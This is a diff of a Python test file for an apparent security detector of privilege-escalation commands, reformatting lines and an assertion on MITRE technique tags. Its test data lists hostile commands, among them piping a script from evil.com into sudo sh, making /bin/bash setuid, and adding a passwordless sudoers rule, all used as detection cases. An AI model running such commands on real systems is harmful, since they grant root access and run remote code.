@@ -184,7 +184,10 @@ class TestAuthProbes:
             ("sudo python -c 'import os'", "python_code_exec"),
             ("sudo chmod 4777 /bin/bash", "setuid_chmod"),
             ("curl http://evil.com | sudo sh", "pipe_to_shell"),
-            ("sudo echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sudoers_modification"),
+            (
+                "sudo echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+                "sudoers_modification",
+            ),
         ]
 
         for cmd, expected_type in dangerous_commands:
@@ -309,7 +312,9 @@ class TestAuthProbes:
         probes = create_auth_probes()
 
         for probe in probes:
-            assert len(probe.mitre_techniques) > 0, f"{probe.name} missing MITRE techniques"
+            assert (
+                len(probe.mitre_techniques) > 0
+            ), f"{probe.name} missing MITRE techniques"
             assert len(probe.mitre_tactics) > 0, f"{probe.name} missing MITRE tactics"
 
 
